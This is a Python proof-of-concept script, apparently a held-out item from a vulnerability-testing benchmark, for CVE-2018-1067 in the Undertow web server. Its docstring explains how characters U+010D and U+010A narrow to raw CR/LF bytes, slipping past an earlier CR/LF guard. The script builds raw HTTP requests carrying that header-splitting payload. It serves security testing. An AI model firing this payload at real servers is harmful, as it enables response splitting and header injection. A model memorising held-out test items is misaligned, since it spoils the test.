#!/usr/bin/env python3
"""[HELD-OUT] CVE-2018-1067 residual for undertow-jboss-wildfly-web-server-cve-2018-1067.

CVE-2016-4993's fix added a CHAR-based CR/LF guard to HttpResponseConduit.writeString:

    for (int i = 0; i < length; i++) {
        char c = string.charAt(i);
        if (c != '\\r' && c != '\\n') { buffer.put((byte) c); }   // <- compares the wide CHAR
    }

The comparison is against the wide `char`, but the byte actually written is `(byte) c` -- the low 8
bits. So any char whose value is NOT U+000D/U+000A yet whose low byte narrows to 0x0D/0x0A slips past
the guard and a REAL CR/LF is written to the wire. The smallest such pair above ASCII is
U+010D (0x010D -> byte 0x0D = CR) and U+010A (0x010A -> byte 0x0A = LF).

So the attacker moves the SAME CRLF split out of a plain "\\r\\n" (blocked on V1) and into the
truncating chars, URL-encoded as their UTF-8 bytes so Undertow decodes them into the header value,
triggered by the SAME external raw-HTTP socket to the published port:

    GET /reflect?v=x%C4%8D%C4%8AX-Split:%20<marker>      (%C4%8D=U+010D, %C4%8A=U+010A)

On V1 (1.4.3.Final .. 1.4.24.Final) writeString's `c != '\\r'` is TRUE for U+010D (0x010D != 0x000D),
so it writes `(byte) 0x010D == 0x0D` -> a real CR, and likewise 0x0A -> LF. The response splits and
the injected "X-Split" becomes its own header line -> the detector confirms the split (REACHES on
V1). On V2 (1.4.25.Final, CVE-2018-1067 patched, commit 85d4478) writeString narrows to a byte FIRST
(`byte b = (byte) c; if (b != '\\r' && b != '\\n')`), so U+010D/U+010A are caught and neutralised to
spaces -> the value folds (`X-Reflect: x  X-Split: ...`), no standalone X-Split header, split never
confirmed (BLOCKED on V2).

Same flag channel as the seed (a genuinely CRLF-framed injected "X-Split" header observed by the
host-side raw-socket detector); the residual only changes the SEPARATOR bytes from a plain CRLF to a
char-narrowing CRLF so it survives the char-only CVE-2016-4993 guard.
"""
import secrets
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from original_poc import build_request  # noqa: E402

# Each vector = a (URL-encoded) separator whose UTF-8 bytes decode to a char pair narrowing to CR/LF.
#   U+010D U+010A  -> %C4%8D %C4%8A  (smallest non-ASCII pair narrowing to 0x0D/0x0A)
VECTORS = [
    ("cve-2018-1067-u010d-u010a-narrowing", b"%C4%8D%C4%8A"),
]


def candidate(vec=None) -> dict:
    vid, sep = vec if vec is not None else VECTORS[0]
    marker = b"BYP" + secrets.token_hex(5).encode()
    return {
        "id": vid,
        "mode": "bypass",
        "marker": marker,
        "raw": build_request(sep, marker),
    }


if __name__ == "__main__":
    for v in VECTORS:
        c = candidate(v)
        print(c["id"], repr(c["raw"]))
